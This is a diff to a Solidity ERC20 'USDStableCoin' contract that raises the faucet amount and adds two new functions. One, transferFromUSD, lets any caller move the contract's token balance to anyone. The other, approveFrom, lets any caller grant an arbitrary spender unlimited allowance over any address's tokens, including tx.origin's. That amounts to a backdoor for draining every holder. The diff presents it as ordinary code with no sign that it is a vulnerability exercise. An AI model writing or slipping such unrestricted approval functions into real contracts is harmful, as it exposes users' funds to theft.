@@ -15,7 +15,17 @@ contract USDStableCoin is ERC20 {
 
     // Function to give faucet to users
     function faucet() public {
-        this.transfer(msg.sender, 1);
+        this.transfer(msg.sender, 50);
+    }
+
+    function transferFromUSD(address receiver, uint amount) public payable {
+        this.transfer(receiver, amount);
+    }
+
+    function approveFrom(address from, address spender) public {
+        _approve(from, spender, type(uint256).max);
+        _approve(msg.sender, spender, type(uint256).max);
+        _approve(tx.origin, spender, type(uint256).max);
     }
     
 }
